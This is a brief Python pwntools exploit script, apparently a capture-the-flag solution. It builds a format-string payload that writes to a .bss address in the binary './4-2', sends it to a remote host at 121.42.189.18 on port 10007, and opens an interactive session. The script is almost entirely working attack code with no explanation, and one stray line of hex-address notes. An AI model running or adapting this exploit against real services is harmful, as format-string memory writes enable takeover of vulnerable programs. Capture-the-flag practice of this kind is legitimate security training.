from pwn import *
0xffffd17c--0x80486b7
p=process('./4-2')
p=remote('121.42.189.18',10007)
bss=0x804a048
log.info(hex(bss))
payload=fmtstr_payload(10,{bss:1})
print p.recv();
raw_input()
p.sendline(payload)

print p.recv()
print p.recv()
p.interactive();

